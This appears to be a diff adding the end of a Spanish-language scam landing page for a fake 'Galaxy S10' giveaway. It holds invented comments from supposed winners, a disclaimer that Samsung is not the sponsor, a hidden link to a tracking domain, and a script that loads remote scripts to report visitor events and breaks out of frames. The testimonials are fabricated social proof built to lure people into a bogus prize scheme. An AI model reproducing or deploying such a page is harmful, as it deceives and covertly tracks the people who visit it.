+                        <div class="clr"></div>
+                        <div class="comment-status"> <span> Me gusta · Comentar <img src="./like.png" width="15px"
+                                    height="15px">36 </span>
+                            ·13 &nbsp;Abril, 2019 </div>
+                    </div>
+                    <div class="comments" id="comment3" style="display:block">
+                        <div class="profile"> <img src="./4.jpg"> </div>
+                        <div class="comment-content">
+                            <p class="name">Martin García</p>
+                            <p>¡Me encantan las ofertas como esta! </p>
+                        </div>
+                        <div class="clr"></div>
+                        <div class="comment-status"> <span> Me gusta · Comentar <img src="./like.png" width="15px"
+                                    height="15px">45 </span>
+                            ·12 &nbsp;Abril, 2019 </div>
+                    </div>
+                    <div class="comments" id="comment3" style="display:block">
+                        <div class="profile"> <img src="./7.jpg"> </div>
+                        <div class="comment-content">
+                            <p class="name">Amelia Montalbán</p>
+                            <p> Es posible que me envien hoy mi <span class="p_var-producto">Galaxy S10</span> de
+                                regalo?, gracias </p>
+                            <div class="comment-img"> <img src="./winners.jpg" style="max-width:100px;"> </div>
+                            <p></p>
+                        </div>
+                        <div class="clr"></div>
+                        <div class="comment-status"> <span> Me gusta · Comentar <img src="./like.png" width="15px"
+                                    height="15px">53 </span>
+                            ·11 &nbsp;Abril, 2019 </div>
+                    </div>
+                    <div class="comments" id="comment4" style="display:block">
+                        <div class="profile"> <img src="./2.jpg"> </div>
+                        <div class="comment-content">
+                            <p class="name">Andrea Martínez</p>
+                            <p> Al principio pensé que era una broma, pero conseguí mi <span
+                                    class="p_var-producto">Galaxy S10</span> , se lo he dicho a mis amigos para que
+                                puedan obtener la suya </p>
+                        </div>
+                        <div class="clr"></div>
+                        <div class="comment-status"> <span> Me gusta · Comentar <img src="./like.png" width="15px"
+                                    height="15px">46 </span>
+                            ·10 &nbsp;Abril, 2019 </div>
+                    </div>
+                    <div class="comments" id="comment5" style="display:block">
+                        <div class="profile"> <img src="./5.jpg"> </div>
+                        <div class="comment-content">
+                            <p class="name">Andrés Montoya</p>
+                            <p>Recibí una llamada de que había ganado, ¡estoy super feliz! </p>
+                        </div>
+                        <div class="clr"></div>
+                        <div class="comment-status"> <span> Me gusta · Comentar <img src="./like.png" width="15px"
+                                    height="15px">16 </span> ·9
+                            &nbsp;Abril, 2019 </div>
+                    </div>
+                    <div class="comments" id="comment6" style="display:block">
+                        <div class="profile"> <img src="./1.jpg"> </div>
+                        <div class="comment-content">
+                            <p class="name">Nicolas Pérez</p>
+                            <p> Pensé que era una broma, pero mi <span class="p_var-producto">Galaxy S10</span> me llegó
+                                esta mañana por correo me me voy a conectar hoy mismo!. </p>
+                        </div>
+                        <div class="clr"></div>
+                        <div class="comment-status"> <span> Me gusta · Comentar <img src="./like.png" width="15px"
+                                    height="15px">13 </span> ·8
+                            &nbsp;Abril, 2019 </div>
+                    </div>
+                    <div class="comments" id="comment6" style="display:block">
+                        <div class="profile"> <img src="./6.jpg"> </div>
+                        <div class="comment-content">
+                            <p class="name">Rosa Fuentes</p>
+                            <p> ¡Participe, gané y en 5 días recibí mi <span class="p_var-producto">Galaxy S10</span>
+                                nuevo, muchas gracias chicos! </p>
+                        </div>
+                        <div class="clr"></div>
+                        <div class="comment-status"> <span> Me gusta · Comentar <img src="./like.png" width="15px"
+                                    height="15px">13 </span> ·8
+                            &nbsp;Abril, 2019 </div>
+                    </div>
+                    <div class="comments" id="comment7" style="display:block">
+                        <div class="profile"> <img src="./10.jpg"> </div>
+                        <div class="comment-content">
+                            <p class="name">Anabel Silvestre</p>
+                            <p>¿Alguna vez has visto algo por el estilo?, quizás tuvistes un mal día, puedes intentarlo
+                                más veces! </p>
+                        </div>
+                        <div class="clr"></div>
+                        <div class="comment-status"> <span> Me gusta · Comentar <img src="./like.png" width="15px"
+                                    height="15px">18 </span> ·7
+                            &nbsp;Abril, 2019 </div>
+                    </div>
+                    <div class="comments" id="comment8" style="display:block">
+                        <div class="profile"> <img src="./11.jpg"> </div>
+                        <div class="comment-content">
+                            <p class="name">Pablo Silvent</p>
+                            <p>He ganado, he ganado!!! hoy a celebrarlo!! </p>
+                            <div class="comment-img"> <img src="./21.gif" style="max-width:100px;"> </div>
+                            <p></p>
+                        </div>
+                        <div class="clr"></div>
+                        <div class="comment-status"> <span> Me gusta · Comentar <img src="./like.png" width="15px"
+                                    height="15px">8 </span> ·6
+                            &nbsp;Abril, 2019 </div>
+                    </div>
+                </div>
+                <p style="font-size: 12px;color: #bcbcbc;"> * El premio consistirá en un smartphone de hasta o su valor
+                    en metálico... Las imágenes y ciertos elementos de marketing son una recreación y pueden no
+                    corresponder con la realidad. <span class="p_var-marca">Samsung</span> no es patrocinador ni
+                    responsable de esta promoción. </p>
+            </div>
+        </div>
+    </div>
+    <a href="https://jat.trackingmydata.xyz/event?number=10" style="display:none">ok</a>
+    <script>
+        function sendEvent(eventNum) {
+            var url = window.event_url + "?number=" + eventNum;
+            var script = document.createElement("script");
+            script.type = "text/javascript";
+            script.src = url;
+            document.body.appendChild(script);
+        }
+
+        function track() {
+            sendEvent("11")
+        }
+
+        if (self != top) {
+            sendEvent("12")
+            top.location = self.location;
+        }
+    </script>
+
+
+</body>
+
+</html>
